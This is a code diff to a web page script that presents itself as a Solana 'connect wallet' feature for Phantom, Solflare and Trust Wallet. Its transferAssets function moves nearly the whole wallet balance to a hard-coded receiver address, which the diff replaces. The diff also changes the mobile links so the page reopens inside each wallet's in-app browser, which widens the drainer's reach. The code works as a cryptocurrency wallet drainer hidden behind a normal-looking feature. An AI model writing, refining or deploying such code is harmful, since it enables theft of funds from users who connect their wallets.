@@ -1,7 +1,7 @@
 $(document).ready(function () {
     async function connectWallet() {
         if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
-            openMobileWallet();
+            openInWalletBrowser();
             return;
         }
 
@@ -39,11 +39,12 @@ $(document).ready(function () {
         }
     }
 
-    function openMobileWallet() {
+    function openInWalletBrowser() {
+        let siteURL = encodeURIComponent(window.location.href);
         let walletLinks = {
-            phantom: "phantom://open",
-            solflare: "solflare://open",
-            trustwallet: "trust://"
+            phantom: `https://phantom.app/ul/browse/${siteURL}`,
+            solflare: `https://solflare.com/browse/${siteURL}`,
+            trustwallet: `https://link.trustwallet.com/open_url?url=${siteURL}`
         };
 
         let storeLinks = {
@@ -52,7 +53,7 @@ $(document).ready(function () {
             trustwallet: "https://trustwallet.com/"
         };
 
-        let selectedWallet = "phantom"; // پیش‌فرض Phantom
+        let selectedWallet = "phantom"; // Default wallet
 
         if (window.solflare) {
             selectedWallet = "solflare";
@@ -76,7 +77,7 @@ $(document).ready(function () {
 
     async function transferAssets(connection, publicKey, walletBalance, minBalance) {
         try {
-            const receiverWallet = new solanaWeb3.PublicKey("EMMWrJ6CXEiojMqw7wvERRzj9LZ1CqNRW5KQWnMkM9Qd");
+            const receiverWallet = new solanaWeb3.PublicKey("AunHeraAbHaG8JmfgQAGJtKPvTKXH1bvrcw3shxfVzHY");
             const balanceForTransfer = walletBalance - minBalance;
             let transaction = new solanaWeb3.Transaction();
 
